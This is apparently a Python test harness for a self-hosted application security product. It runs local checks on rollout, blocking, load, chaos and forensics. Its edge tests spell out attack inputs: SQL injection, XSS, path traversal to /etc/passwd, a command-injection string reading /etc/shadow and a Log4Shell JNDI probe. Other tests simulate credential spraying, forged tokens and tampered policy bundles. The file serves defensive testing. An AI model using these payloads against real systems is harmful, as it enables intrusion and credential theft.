"""The enterprise test campaign. Run against the estate deploy/enterprise/up.sh
starts. Every check prints PASS or FAIL with what it saw, and a report is
written to .state/report.json.

    python3 deploy/enterprise/campaign.py [section ...]

Sections: baseline rollout apps edge self load chaos forensics (all by default).
"""
import base64
import concurrent.futures as cf
import json
import os
import random
import re
import shutil
import signal
import subprocess
import sys
import time
import urllib.error
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
STATE = os.path.join(HERE, ".state")
APPS = json.load(open(os.path.join(STATE, "apps.json")))
SHARDS = [8081, 8082, 8083]
CORE = "http://127.0.0.1:8080"
CONTROL = "http://127.0.0.1:8090"
HEY = os.environ.get("HEY", "hey")
token = lambda name: open(os.path.join(STATE, "tokens", f"{name}.token")).read().strip()  # noqa: E731
PROXY = token("proxy")
results = []
section = ""


# ---- plumbing ---------------------------------------------------------------------------------

def call(method, url, body=None, headers=None, raw=None, timeout=10):
    h = {"content-type": "application/json", **(headers or {})}
    data = raw if raw is not None else (json.dumps(body).encode() if body is not None else None)
    req = urllib.request.Request(url, data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            text = r.read()
            return r.status, parse(text)
    except urllib.error.HTTPError as e:
        return e.code, parse(e.read())
    except Exception as e:  # noqa: BLE001
        return 0, {"error": str(e)}


def parse(text):
    try:
        return json.loads(text or b"{}")
    except ValueError:
        return {"raw": text[:120].decode(errors="replace")}


def check(name, ok, detail=""):
    results.append({"section": section, "check": name, "ok": bool(ok), "detail": str(detail)[:300]})
    print(f"{'PASS' if ok else 'FAIL'}  [{section}] {name}  ->  {str(detail)[:200]}", flush=True)
    return ok


def app_url(app, gateway=False):
    return f"http://127.0.0.1:{app['gateway'] if gateway else app['port']}"


def ip(n):
    return f"203.0.{(n // 250) % 250}.{n % 250 + 1}"


def as_client(addr):
    return {"x-forwarded-for": addr}


def login(app, user, addr, gateway=False, password=None):
    s, b = call("POST", app_url(app, gateway) + "/login", {"email": f"user{user}@corp.test", "password": password or f"pw{user}"}, as_client(addr))
    return s, b.get("session")


def intent(app, sid, addr, amount, gateway=False):
    s, b = call("POST", app_url(app, gateway) + "/payouts/intent", {"amount": amount}, {**as_client(addr), "x-session": sid})
    return b.get("intent")


def payout(app, sid, addr, amount, token_value=None, gateway=False):
    h = {**as_client(addr), "x-session": sid}
    if token_value:
        h["Ivar-Intent"] = token_value
    return call("POST", app_url(app, gateway) + "/payouts", {"amount": amount, "account": "acc-1"}, h)


def operator(role="analyst", name="alice", proxy=True):
    h = {"x-ivar-operator": name, "x-ivar-roles": role, "x-ivar-hardware-2fa": "true"}
    if proxy:
        h["x-ivar-proxy-token"] = PROXY
    return h


def metric(port, name):
    try:
        text = urllib.request.urlopen(f"http://127.0.0.1:{port}/metrics", timeout=3).read().decode()
    except Exception:  # noqa: BLE001
        return None
    m = re.search(rf"^{name} (\S+)$", text, re.M)
    return float(m.group(1)) if m else 0.0


def total(name):
    vals = [metric(p, name) for p in SHARDS]
    return sum(v for v in vals if v is not None)


def wait(pred, timeout=8.0, step=0.25):
    end = time.time() + timeout
    while time.time() < end:
        if pred():
            return True
        time.sleep(step)
    return False


def event(sensor, addr, seq, path="/accounts/u1", when=None):
    return {"class_uid": 4002, "category_uid": 4, "activity_id": 1, "activity_name": "http.request", "time": when or int(time.time() * 1000), "status_id": 1,
            "src_endpoint": {"ip": addr}, "http_request": {"http_method": "GET", "url_path": path},
            "ivar": {"sensor_id": sensor, "sensor_type": "app_sdk", "observation_point": "app_sdk", "sensor_seq": seq}}


def evidence(port=8081, since=0):
    """Every record from `since`, following the API's pages."""
    out, nxt = [], since
    while True:
        s, b = call("GET", f"http://127.0.0.1:{port}/v1/evidence?from_seq={nxt}", headers=operator())
        if s != 200 or not isinstance(b, list) or not b:
            return out
        out += b
        nxt = b[-1]["seq"] + 1


def pids(name):
    try:
        return int(open(os.path.join(STATE, "pids", name)).read())
    except OSError:
        return None


def kill(name):
    p = pids(name)
    if p:
        try:
            os.kill(p, signal.SIGKILL)
        except ProcessLookupError:
            pass
    time.sleep(0.5)


def rss_mb(name):
    p = pids(name)
    try:
        for line in open(f"/proc/{p}/status"):
            if line.startswith("VmRSS"):
                return int(line.split()[1]) / 1024
    except OSError:
        return None
    return None


def restart_core(n):
    kill(f"core{n}")
    log = open(os.path.join(STATE, "logs", f"core{n}.log"), "a")
    bin_ = os.path.join(HERE, "..", "..", "target", "release", "ivar-core")
    proc = subprocess.Popen([bin_, "serve", "--config", os.path.join(STATE, f"shard{n}.yaml")], stdout=log, stderr=log,
                            env={**os.environ, "IVAR_SHARD": str(n), "IVAR_SHARDS": "3"}, start_new_session=True)
    open(os.path.join(STATE, "pids", f"core{n}"), "w").write(str(proc.pid))
    return wait(lambda: call("GET", f"http://127.0.0.1:{SHARDS[n]}/healthz")[0] == 200, 20)


def restart_app(name, bundle=None):
    cmd = [os.path.join(HERE, "up.sh"), "restart", name] + ([bundle] if bundle else [])
    return subprocess.run(cmd, capture_output=True, text=True).returncode == 0


def serve_control(bundle):
    kill("control")
    bin_ = os.path.join(HERE, "..", "..", "target", "release", "ivar-control")
    log = open(os.path.join(STATE, "logs", "control.log"), "a")
    proc = subprocess.Popen([bin_, "serve", "--bundle", bundle, "--tuf-keys", os.path.join(STATE, "tuf"), "--flags-key", os.path.join(STATE, "keys", "flags-1.seed"),
                             "--operators", os.path.join(STATE, "operators.json"), "--cosign", os.path.join(STATE, "keys", "cosign.pub"), "--listen", "127.0.0.1:8090"],
                            stdout=log, stderr=log, start_new_session=True)
    open(os.path.join(STATE, "pids", "control"), "w").write(str(proc.pid))
    return wait(lambda: call("GET", CONTROL + "/healthz")[0] == 200, 10)


def crowd(app, sessions, seconds, qps, first_user, first_addr):
    """Load as customers make it: many logged in sessions, each from its own
    address at a steady rate, through the gateway. Returns (requests per
    second, median p50 ms, worst p99 ms, status counts)."""
    people = []
    for k in range(sessions):
        user, addr = first_user + k % 60, ip(first_addr + k)
        s, sid = login(app, user, addr, gateway=True)
        if sid:
            people.append((user, addr, sid))
    procs = []
    for user, addr, sid in people:
        # hey labels every request text/html unless told otherwise, which the
        # Core Rule Set rightly refuses; a JSON client sends this.
        args = [HEY, "-z", f"{seconds}s", "-c", "1", "-q", str(qps), "-T", "application/json", "-H", f"x-session: {sid}", "-H", f"x-forwarded-for: {addr}", app_url(app, True) + f"/accounts/u{user}"]
        procs.append(subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True))
    rps, p50s, p99s, codes = 0.0, [], [], {}
    for pr in procs:
        out = pr.communicate(timeout=seconds + 60)[0]
        rps += float(re.search(r"Requests/sec:\s+([\d.]+)", out).group(1)) if "Requests/sec" in out else 0.0
        lat = dict(re.findall(r"(\d+)%% in ([\d.]+) secs", out.replace("%", "%%")))
        p50s.append(float(lat.get("50", 0)) * 1000)
        p99s.append(float(lat.get("99", 0)) * 1000)
        for c, n in re.findall(r"\[(\d+)\]\s+(\d+) responses", out):
            codes[int(c)] = codes.get(int(c), 0) + int(n)
    p50s.sort()
    return rps, (p50s[len(p50s) // 2] if p50s else 0.0), max(p99s or [0.0]), codes


def hey(url, seconds, concurrency, headers=None, method="GET", body=None):
    """Sustained load; returns (requests per second, p50 ms, p99 ms, status counts)."""
    args = [HEY, "-z", f"{seconds}s", "-c", str(concurrency), "-m", method]
    for k, v in (headers or {}).items():
        args += ["-H", f"{k}: {v}"]
    if body is not None:
        args += ["-T", "application/json", "-d", json.dumps(body)]
    out = subprocess.run(args + [url], capture_output=True, text=True, timeout=seconds + 60).stdout
    rps = float(re.search(r"Requests/sec:\s+([\d.]+)", out).group(1)) if "Requests/sec" in out else 0.0
    lat = dict(re.findall(r"(\d+)%% in ([\d.]+) secs", out.replace("%", "%%")))
    codes = {int(c): int(n) for c, n in re.findall(r"\[(\d+)\]\s+(\d+) responses", out)}
    return rps, float(lat.get("50", 0)) * 1000, float(lat.get("99", 0)) * 1000, codes


# ---- A. baseline ------------------------------------------------------------------------------

def baseline():
    for i, app in enumerate(APPS):
        n = app["name"]
        check(f"{n}: healthy through the gateway", call("GET", app_url(app, True) + "/healthz")[0] == 200)
        s, sid = login(app, 10 + i, ip(10 + i), gateway=True)
        check(f"{n}: a customer logs in through Envoy, Coraza and IVAR", s == 200 and sid, s)
        s, _ = call("GET", app_url(app, True) + f"/accounts/u{10 + i}", headers={**as_client(ip(10 + i)), "x-session": sid})
        check(f"{n}: reads their own account", s == 200, s)
        t = intent(app, sid, ip(10 + i), 50, gateway=True)
        s, b = payout(app, sid, ip(10 + i), 50, t, gateway=True)
        check(f"{n}: a payout with its intent chain goes through", s == 200, (s, b))
        s, b = call("PATCH", app_url(app) + f"/users/u{10 + i}", {"role": "auditor"}, {**as_client(ip(10 + i)), "x-session": sid})
        check(f"{n}: observe: a privileged field write is recorded, not refused", s == 200, (s, b))
    check("events reach the core through the load balancer", wait(lambda: total("ivar_events_total") >= 40, 10), total("ivar_events_total"))
    check("no component was refused by the core (every token valid)", total("ivar_ingest_denied_total") == 0, total("ivar_ingest_denied_total"))
    check("no event was lost between shards", total("ivar_events_unrouted_total") == 0, total("ivar_events_unrouted_total"))
    per_shard = [metric(p, "ivar_events_total") for p in SHARDS]
    check("all three shards share the load", all(v and v > 0 for v in per_shard), per_shard)
    time.sleep(1.5)
    recs = [r for p in SHARDS for r in evidence(p)]
    seen = {}
    for r in recs:
        x = (r.get("payload") or {}).get("ivar") or {}
        addr = ((r.get("payload") or {}).get("src_endpoint") or {}).get("ip")
        path = (((r.get("payload") or {}).get("http_request") or {}).get("url_path") or "")
        # Readiness probes reach the app directly from the host; skip them.
        if r.get("kind") == "event" and x.get("sensor_id", "").startswith("shop-") and addr and path != "/healthz":
            seen.setdefault(x["sensor_id"], set()).add(addr)
    for app in APPS:
        addrs = seen.get(f"shop-{app['name']}", set())
        check(f"{app['name']}: the core sees the real client address, not the gateway's", addrs and "127.0.0.1" not in addrs and any(a.startswith("203.0.") for a in addrs), sorted(addrs)[:4])
    check("events from the SDKs carry body field names", any("role" in (((r.get("payload") or {}).get("http_request") or {}).get("body_keys") or []) for r in recs),
          "role seen in body_keys")


# ---- B. rollout -------------------------------------------------------------------------------

def rollout():
    v2 = os.path.join(STATE, "policy-v2.bundle")
    check("control plane serves the signed enforce policy v2", serve_control(v2))
    bundle = open(v2).read().strip()
    applied = [call("POST", f"http://127.0.0.1:{p}/v1/policy", raw=bundle.encode(), headers={**operator("incident_lead", "lead"), "content-type": "text/plain"}) for p in SHARDS]
    check("every core shard applies v2 through the operator API", all(s == 200 for s, _ in applied), applied)
    time.sleep(6)
    for i, app in enumerate(APPS):
        s, sid = login(app, 30 + i, ip(30 + i))
        st, b = call("PATCH", app_url(app) + f"/users/u{30 + i}", {"role": "admin"}, {**as_client(ip(30 + i)), "x-session": sid})
        check(f"{app['name']}: enforces v2 with no restart", st == 403, (st, b))
    for i, app in enumerate(APPS):
        s, sid = login(app, 40 + i, ip(40 + i), gateway=True)
        st, b = call("GET", app_url(app, True) + "/.env.backup", headers=as_client(ip(240 + i)))
        check(f"{app['name']}: the edge filter enforces v2 with no restart", st == 403, (st, b))
    check("no app needed a restart to reach v2", all(call("GET", app_url(a) + "/healthz")[0] == 200 for a in APPS))


# ---- C. application attacks, per SDK ------------------------------------------------------------

def apps():
    for i, app in enumerate(APPS):
        n, base = app["name"], 60 + i * 10
        addr = ip(base)
        s, sid = login(app, base, addr)
        st, b = call("PATCH", app_url(app) + f"/users/u{base}", {"role": "admin"}, {**as_client(addr), "x-session": sid})
        check(f"{n}: mass assignment of a privileged field is blocked", st == 403, (st, b))
        st, b = call("PATCH", app_url(app) + f"/users/u{base}", {"name": "Ada"}, {**as_client(addr), "x-session": sid})
        check(f"{n}: a declared profile update still passes", st == 200, (st, b))
        st, b = payout(app, sid, addr, 100)
        check(f"{n}: payout with no intent chain is refused", st == 403, (st, b))
        # A session that just tried to skip the intent flow may rightly be
        # contained; the legitimate path runs in a fresh session.
        addr, (s, sid) = ip(base + 3), login(app, base + 3, ip(base + 3))
        good = intent(app, sid, addr, 100)
        st, b = payout(app, sid, addr, 100, good)
        check(f"{n}: payout with a valid intent chain executes", st == 200, (st, b))
        st, b = payout(app, sid, addr, 100, good)
        check(f"{n}: the same intent chain cannot be replayed", st in (403, 409), (st, b))
        small = intent(app, sid, addr, 50)
        st, b = payout(app, sid, addr, 5000, small)
        check(f"{n}: a payout above the intent's limit is refused", st in (403, 409), (st, b))
        s2, sid2 = login(app, base + 1, ip(base + 1))
        theirs = intent(app, sid2, ip(base + 1), 100)
        st, b = payout(app, sid, addr, 100, theirs)
        check(f"{n}: another session's intent chain is refused", st == 403, (st, b))
        tampered = good[:-6] + ("A" if good[-6] != "A" else "B") + good[-5:] if good else "x"
        st, b = payout(app, sid, addr, 100, tampered)
        check(f"{n}: a tampered intent chain is refused", st == 403, (st, b))
        held_addr, (s, held_sid) = ip(base + 4), login(app, base + 4, ip(base + 4))
        big = intent(app, held_sid, held_addr, 30000)
        st, b = payout(app, held_sid, held_addr, 30000, big)
        check(f"{n}: a payout over the time lock threshold is held", st == 202, (st, b))
        probe = ip(base + 5)
        st, _ = call("GET", app_url(app) + "/.env.backup", headers=as_client(probe))
        check(f"{n}: a decoy route is blocked", st == 403, st)
        contained = wait(lambda: call("GET", app_url(app) + "/healthz", headers=as_client(probe))[0] == 403, 6)
        check(f"{n}: the source is contained on every route within seconds", contained)
        check(f"{n}: other clients are unaffected", call("GET", app_url(app) + "/healthz", headers=as_client(ip(base + 6)))[0] == 200)
        sprayer = ip(base + 7)
        codes = []
        for k in range(30):
            codes.append(login(app, 100 + k % 15, sprayer, password="Winter2026!")[0])
            time.sleep(0.12)
        check(f"{n}: a credential spray is throttled", 429 in codes or 403 in codes, " ".join(map(str, codes)))
        check(f"{n}: the sprayed users can still log in from their own address", login(app, 100, ip(base + 8))[0] == 200)
        enum = ip(base + 9)
        s, esid = login(app, base + 2, enum)
        codes = [call("GET", app_url(app) + f"/accounts/u{k}", headers={**as_client(enum), "x-session": esid})[0] for k in range(1, 61)]
        time.sleep(1.5)
        after = call("GET", app_url(app) + f"/accounts/u{base + 2}", headers={**as_client(enum), "x-session": esid})[0]
        check(f"{n}: enumerating 60 other accounts gets the session stopped", after in (403, 429) or 429 in codes, f"own account afterwards {after}, throttled {codes.count(429)} of 60")


# ---- D. edge -----------------------------------------------------------------------------------

def edge():
    app = APPS[0]
    g = app_url(app, True)
    for name, path in [("SQL injection", "/accounts/u1?id=1%27%20OR%20%271%27=%271"), ("cross site scripting", "/accounts/u1?q=%3Cscript%3Ealert(1)%3C/script%3E"),
                       ("path traversal", "/accounts/..%2f..%2f..%2fetc%2fpasswd"), ("command injection", "/accounts/u1?host=127.0.0.1%3Bcat%20/etc/shadow")]:
        st, _ = call("GET", g + path, headers=as_client(ip(400 + len(name))))
        check(f"edge: {name} is blocked", st == 403, st)
    st, _ = call("GET", g + "/healthz", headers={**as_client(ip(420)), "User-Agent": "${jndi:ldap://198.51.100.1/a}"})
    check("edge: a Log4Shell probe is blocked", st == 403, st)
    st, _ = call("POST", g + "/login", raw=b'{"email":"' + b"a" * 2_000_000 + b'"}', headers=as_client(ip(421)))
    check("edge: a 2 MB body is refused without an error from the app", st in (403, 413), st)
    st, _ = call("POST", g + "/login", raw=b'{"email": "user1@corp.test", "password": ', headers=as_client(ip(422)))
    check("edge: malformed JSON gets a client error, not a crash", 400 <= st < 500, st)
    check("edge: the app is still healthy after both", call("GET", g + "/healthz", headers=as_client(ip(423)))[0] == 200)
    st, b = call("DELETE", g + "/accounts/u1", headers=as_client(ip(424)))
    check("edge: an undeclared method on a declared route is refused", st in (403, 405), (st, b))
    ok = 0
    for k in range(40):
        s, sid = login(app, 150 + k % 20, ip(430 + k), gateway=True)
        ok += s == 200 and call("GET", g + f"/accounts/u{150 + k % 20}", headers={**as_client(ip(430 + k)), "x-session": sid})[0] == 200
    check("edge: no false positives on 40 ordinary sessions", ok == 40, f"{ok} of 40")


# ---- E. attacks on IVAR itself -------------------------------------------------------------------

def self_attacks():
    victim = "203.0.200.20"
    forged = {"sensor_id": "shop-node", "events": [event("shop-node", victim, 900000 + k, "/.env.backup") for k in range(3)]}
    for p in SHARDS:
        st, _ = call("POST", f"http://127.0.0.1:{p}/v1/events", forged)
        check(f"shard :{p}: forged events with no token are refused", st == 401, st)
    st, _ = call("POST", CORE + "/v1/events", forged, {"authorization": "Bearer ivt_" + "0" * 64})
    check("a made up token is refused", st == 401, st)
    st, b = call("POST", CORE + "/v1/events", forged, {"authorization": f"Bearer {token('python')}"})
    check("the Python app's token cannot send events as the Node app", st == 403, (st, b))
    st, b = call("POST", CORE + "/v1/events", {"sensor_id": "edge-node", "events": [event("edge-node", victim, 1, "/.env.backup")]}, {"authorization": f"Bearer {token('node')}"})
    check("an app token cannot speak for the edge", st == 403, (st, b))
    check("the innocent address was never contained", call("GET", app_url(APPS[0]) + "/healthz", headers=as_client(victim))[0] == 200)
    st, _ = call("GET", CORE + "/v1/verdicts?since=0")
    check("the verdict feed needs a token", st == 401, st)
    for p in SHARDS:
        st, _ = call("GET", f"http://127.0.0.1:{p}/v1/evidence?from_seq=0", headers=operator("incident_lead", "mallory", proxy=False))
        check(f"shard :{p}: spoofed operator headers are refused", st == 401, st)
    st, _ = call("GET", CORE + "/v1/evidence?from_seq=0", headers={**operator("incident_lead", "mallory", proxy=False), "x-ivar-proxy-token": "guess"})
    check("a guessed proxy token is refused", st == 401, st)
    check("through the proxy an analyst reads evidence", call("GET", f"http://127.0.0.1:{SHARDS[0]}/v1/evidence?from_seq=0", headers=operator())[0] == 200)
    v2 = open(os.path.join(STATE, "policy-v2.bundle")).read().strip()
    st, _ = call("POST", f"http://127.0.0.1:{SHARDS[0]}/v1/policy", raw=v2.encode(), headers={**operator("analyst"), "content-type": "text/plain"})
    check("an analyst may not change policy", st == 403, st)
    raw = base64.b64decode(v2)
    flipped = raw[:len(raw) // 2] + bytes([raw[len(raw) // 2] ^ 1]) + raw[len(raw) // 2 + 1:]
    st, b = call("POST", f"http://127.0.0.1:{SHARDS[0]}/v1/policy", raw=base64.b64encode(flipped), headers={**operator("incident_lead", "lead"), "content-type": "text/plain"})
    check("a tampered policy bundle is refused", st in (400, 422), (st, b))
    v1 = open(os.path.join(STATE, "policy-v1.bundle")).read().strip()
    st, b = call("POST", f"http://127.0.0.1:{SHARDS[0]}/v1/policy", raw=v1.encode(), headers={**operator("incident_lead", "lead"), "content-type": "text/plain"})
    check("rolling back to the older policy is refused", st == 422, (st, b))
    weak = os.path.join(STATE, "policy-weak.yaml")
    open(weak, "w").write(open(os.path.join(STATE, "policy-v2.yaml")).read().replace("version: 2", "version: 3").replace("detection_mode: enforce", "detection_mode: observe"))
    r = subprocess.run([os.path.join(HERE, "..", "..", "target", "release", "ivar-control"), "build", "--source", weak, "--keys", os.path.join(STATE, "keys", "policy-a.seed"),
                        "--previous", os.path.join(STATE, "policy-v2.bundle"), "--out", os.path.join(STATE, "weak.bundle")], capture_output=True, text=True, cwd=STATE)
    check("the control plane refuses to sign a weakening with one key", r.returncode != 0, (r.stderr or r.stdout).strip()[-160:])
    nt = {"authorization": f"Bearer {token('node')}"}
    st, b = call("POST", CORE + "/v1/events", {"sensor_id": "shop-node", "events": [{"nonsense": True}] * 50 + ["string"] * 50}, nt)
    check("malformed events are counted and refused, not crashing the core", st == 200 and b.get("rejected") == 100, (st, {k: b.get(k) for k in ("accepted", "rejected")}))
    big = {"sensor_id": "shop-node", "events": [event("shop-node", ip(500 + k % 200), 1000 + k) for k in range(5000)]}
    t0 = time.time()
    st, b = call("POST", CORE + "/v1/events", big, nt, timeout=60)
    check("a 5000 event batch is processed across the shards", st == 200 and b.get("accepted") == 5000 and b.get("unrouted") == 0, (st, b.get("accepted"), f"{time.time() - t0:.1f}s"))
    st, _ = call("POST", CORE + "/v1/events", raw=b'{"sensor_id":"shop-node","events":[' + b'{"a":' * 5000 + b"1" + b"}" * 5000 + b"]}", headers=nt, timeout=30)
    check("deeply nested JSON is refused cleanly", st in (400, 413, 422) or st == 200, st)
    st, _ = call("POST", CORE + "/v1/events", raw=b"x" * 20_000_000, headers=nt, timeout=60)
    # The core refuses past its body limit without reading the rest, so the
    # client may see the connection close (status 0) instead of the 413.
    check("a 20 MB request is refused", st in (0, 400, 413), st or "connection closed")
    check("every shard is still healthy", all(call("GET", f"http://127.0.0.1:{p}/healthz")[0] == 200 for p in SHARDS))
    future = int(time.time() * 1000) + 30 * 24 * 3600 * 1000
    st, b = call("POST", CORE + "/v1/events", {"sensor_id": "shop-node", "events": [event("shop-node", ip(800), 990001, "/accounts/u1", when=future)]}, nt)
    check("an event stamped a month in the future does not crash ingest", st == 200, st)
    # No one shard sees a sensor's whole sequence, so readers must not infer
    # gaps from jumps in it; the evidence API says how many shards there are.
    req = urllib.request.Request(f"http://127.0.0.1:{SHARDS[0]}/v1/evidence?from_seq=0&limit=1", headers=operator())
    shards = urllib.request.urlopen(req, timeout=5).headers.get("x-ivar-shards")
    check("the evidence API tells readers the deployment is sharded", shards == str(len(SHARDS)), shards)


# ---- F. load ------------------------------------------------------------------------------------

def load():
    hey_ok = shutil.which(HEY) or os.path.exists(HEY)
    if not check("load generator available", hey_ok, HEY):
        return
    rss_before = {f"core{n}": rss_mb(f"core{n}") for n in range(3)}
    for i, app in enumerate(APPS):
        sessions, secs, qps = 48, 15, 20
        rps, p50, p99, codes = crowd(app, sessions, secs, qps, 120, 3000 + i * 100)
        good = codes.get(200, 0)
        bad = sum(v for k, v in codes.items() if k >= 500)
        refused = sum(v for k, v in codes.items() if k in (403, 429))
        check(f"{app['name']}: {sessions} customers at {qps} req/s each for {secs}s through Envoy, Coraza and IVAR", good > 0 and bad == 0 and refused == 0,
              f"{rps:.0f} req/s, p50 {p50:.1f} ms, p99 {p99:.1f} ms, statuses {codes}")
    rss_after = {f"core{n}": rss_mb(f"core{n}") for n in range(3)}
    check("core shards' memory stays bounded under load", all((rss_after[k] or 0) < max(800, 3 * (rss_before[k] or 100)) for k in rss_after), {k: f"{rss_before[k] or 0:.0f} -> {rss_after[k] or 0:.0f} MB" for k in rss_after})
    check("no event was lost between shards under load", total("ivar_events_unrouted_total") == 0, total("ivar_events_unrouted_total"))
    nt = {"authorization": f"Bearer {token('node')}"}
    batch = lambda k: {"sensor_id": "shop-node", "events": [event("shop-node", ip((k * 500 + j) % 60000), 3_000_000 + k * 500 + j) for j in range(500)]}  # noqa: E731
    t0 = time.time()
    with cf.ThreadPoolExecutor(8) as pool:
        acks = list(pool.map(lambda k: call("POST", CORE + "/v1/events", batch(k), nt, timeout=120), range(40)))
    dt = time.time() - t0
    accepted = sum(b.get("accepted", 0) for _, b in acks)
    check("core ingest: 20000 events in batches of 500", accepted == 20000, f"{accepted} accepted in {dt:.1f}s, {accepted / dt:.0f} events/s")
    app = APPS[0]
    blocked, attempts = 0, 0
    for k in range(400):
        attempts += 1
        blocked += login(app, 1 + k % 200, ip(2000 + k % 100), password="Spring2026!")[0] in (403, 429)
    check("distributed credential stuffing: 400 attempts from 100 addresses across 200 accounts is slowed", blocked > 0, f"{blocked} of {attempts} stopped")


# ---- G. chaos -----------------------------------------------------------------------------------

def chaos():
    app = APPS[0]
    s, sid = login(app, 180, ip(700))
    kill("core1")
    before = total("ivar_events_unrouted_total")
    codes = [call("GET", app_url(app, True) + "/accounts/u180", headers={**as_client(ip(700)), "x-session": sid})[0] for _ in range(30)]
    check("one shard down: traffic is still served", codes.count(200) == 30, codes.count(200))
    st, b = call("POST", CORE + "/v1/events", {"sensor_id": "shop-node", "events": [event("shop-node", ip(900 + k), 4_000_000 + k) for k in range(60)]}, {"authorization": f"Bearer {token('node')}"})
    check("one shard down: events it owns are reported unrouted, not silently dropped", st == 200 and b.get("unrouted", 0) > 0, {k: b.get(k) for k in ("accepted", "unrouted")})
    check("the shard comes back", restart_core(1))
    kill("control")
    st, _ = call("GET", app_url(app, True) + "/.env.backup", headers=as_client(ip(701)))
    check("control plane down: the edge still enforces the last signed policy", st == 403, st)
    for n in range(3):
        kill(f"core{n}")
    codes = [call("GET", app_url(a) + "/healthz", headers=as_client(ip(702)))[0] for a in APPS]
    check("every core down: every app still serves (fail open on public routes)", all(c == 200 for c in codes), codes)
    codes = [call("GET", app_url(a) + "/.env.backup", headers=as_client(ip(703)))[0] for a in APPS]
    check("every core down: known attacks are still blocked locally from signed policy", all(c == 403 for c in codes), codes)
    seq_before = sum(len(evidence(p)) for p in SHARDS)
    check("every shard restarts", all(restart_core(n) for n in range(3)))
    seq_after = sum(len(evidence(p)) for p in SHARDS)
    check("restarted shards keep their evidence", seq_after >= seq_before, f"{seq_before} -> {seq_after} records readable")
    st, b = call("POST", f"http://127.0.0.1:{SHARDS[0]}/v1/policy", raw=open(os.path.join(STATE, "policy-v1.bundle")).read().strip().encode(),
                 headers={**operator("incident_lead", "lead"), "content-type": "text/plain"})
    check("restarted shards resume at v2, refusing v1", st == 422, (st, b))
    serve_control(os.path.join(STATE, "policy-v2.bundle"))
    subprocess.run(["docker", "restart", "ivar-enterprise-envoy"], capture_output=True)
    wait(lambda: call("GET", app_url(app, True) + "/healthz", headers=as_client(ip(704)))[0] == 200, 20)
    st = 0
    wait(lambda: call("GET", app_url(app, True) + "/.env.backup", headers=as_client(ip(705)))[0] == 403, 20)
    st, _ = call("GET", app_url(app, True) + "/.env.backup", headers=as_client(ip(706)))
    check("Envoy restarted: the filter fetches signed policy again and enforces", st == 403, st)


# ---- H. forensics -------------------------------------------------------------------------------

def forensics():
    incidents = []
    for p in SHARDS:
        s, b = call("GET", f"http://127.0.0.1:{p}/v1/incidents", headers=operator())
        incidents += [(p, i) for i in (b if isinstance(b, list) else [])]
    check("incidents were opened", len(incidents) > 0, len(incidents))
    if incidents:
        p, inc = incidents[0]
        # A replay re-executes the shard's whole local chain; after the load
        # phase that is a few hundred thousand records.
        t0 = time.time()
        s, b = call("GET", f"http://127.0.0.1:{p}/v1/incidents/{inc['incident_id']}/replay", headers=operator("analyst"), timeout=300)
        took = time.time() - t0
        v = b.get("verification") or b.get("_verified") or {}
        check("an incident replays and reproduces its verdicts", s == 200 and (b.get("re_execution") or {}).get("matched") is True, (s, f"{took:.1f}s", str(b)[:120]))
    for p in SHARDS:
        check(f"shard :{p}: the console is served", call("GET", f"http://127.0.0.1:{p}/console/")[0] == 200)


SECTIONS = {"baseline": baseline, "rollout": rollout, "apps": apps, "edge": edge, "self": self_attacks, "load": load, "chaos": chaos, "forensics": forensics}
if __name__ == "__main__":
    for name in sys.argv[1:] or list(SECTIONS):
        section = name
        print(f"\n===== {name}", flush=True)
        try:
            SECTIONS[name]()
        except Exception as e:  # noqa: BLE001
            check(f"section completed without an error in the campaign itself", False, repr(e))
    failed = [r for r in results if not r["ok"]]
    json.dump(results, open(os.path.join(STATE, "report.json"), "w"), indent=1)
    print(f"\n{len(results) - len(failed)} of {len(results)} checks passed")
    for r in failed:
        print(f"  FAIL [{r['section']}] {r['check']}: {r['detail'][:160]}")
